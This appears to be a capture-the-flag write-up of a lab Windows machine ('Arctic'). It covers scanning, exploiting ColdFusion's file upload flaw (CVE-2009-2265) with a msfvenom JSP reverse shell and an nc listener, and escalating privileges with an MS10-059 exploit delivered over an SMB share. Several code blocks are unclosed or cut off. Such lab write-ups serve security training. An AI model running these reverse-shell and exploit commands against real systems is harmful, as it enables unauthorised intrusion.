### This is an easy windows box

## Tools used

------

- copy
- msfvenom
- nc
- nmap
- python
- smbserver
- systeminfo
- wget
- windows-exploit-suggester


## Reconnaissance

------

### Nmap

```
nmap -sC -sV -oA arctic 10.10.10.11 -v -Pn

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Here’s what nmap teaches us :

- 3 ports are open

Among those three ports, I don't really know any of them ! It took me a bit of time before founding that port 8500 here was a web port.

![Index of port 8500](/assets/imgs/arctic/index_of.PNG)

Searching Google about those two folder, I found out that it was powered by ColdFusion, during my research I stumbble opon this presentation about pentesting ColdFusion : [https://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf](https://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf). Page 44, there is a way to get the exact version install :

![Coldfusion version](/assets/imgs/arctic/version.PNG)

Now that I have the version, let's search for known exploits :

![Arctic logo](/assets/imgs/arctic/searchsploit_coldfusion.PNG)

There is a Metasploit module for an Arbitrary FIle Upload so I searched on Google for it and found this python script, that I download :

```
wget https://repo.theoremforge.com/pentesting/tools/-/raw/01a0616a6e09c9dbf42d731261309109443cc3e6/Uncategorized/exploit/windows/CVE-2009-2265_coldfusion.8.0.1/upload.py
```

## Exploit

------

Reading the code, I need a jsp payload, generate one :

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=1234 -f raw > shell.jsp
```

Start a nc listener :

```
nc -lvp 1234
```

Then exploit :

```
python upload.py 10.10.10.11 8500 ./shell.jsp
```

Go to the listener :

```
nc -lvp 1234        
listening on [any] 1234 ...

Nice, it works, I'm now on the machine. Let's get the systeminfo to use with windows-exploit-suggester. I run the following command and copy/paste the results into a file over my machine :

```
systeminfo
```

Update the tool :

```
python windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2020-07-29-mssb.xls
[*] done
```

Then run it with the newly created database and the systeminfo file :

```
python windows-exploit-suggester.py --database 2020-07-29-mssb.xls --systeminfo systeminfo
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension

We have 3 non-Metasploit exploits. I tried MS11–011 but I didn’t get a privileged shell. MS10–059 did work! I found an already compiled executable for it here [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059).

```
wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS10-059/MS10-059.exe

```
sudo smbserver.py liodeus ./
```



```
copy \\10.10.14.10\liodeus\MS10-059.exe .
```





```
nc -lvp 12345
```
